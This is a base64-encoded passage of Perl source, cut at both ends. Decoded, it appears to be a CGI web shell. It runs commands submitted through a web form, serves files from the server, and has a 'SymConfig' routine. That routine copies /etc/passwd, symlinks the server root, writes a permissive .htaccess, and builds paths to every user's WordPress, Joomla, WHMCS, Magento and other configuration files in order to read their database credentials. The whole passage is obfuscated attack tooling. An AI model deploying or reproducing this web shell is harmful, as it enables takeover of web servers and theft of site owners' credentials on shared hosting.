xpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAgICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR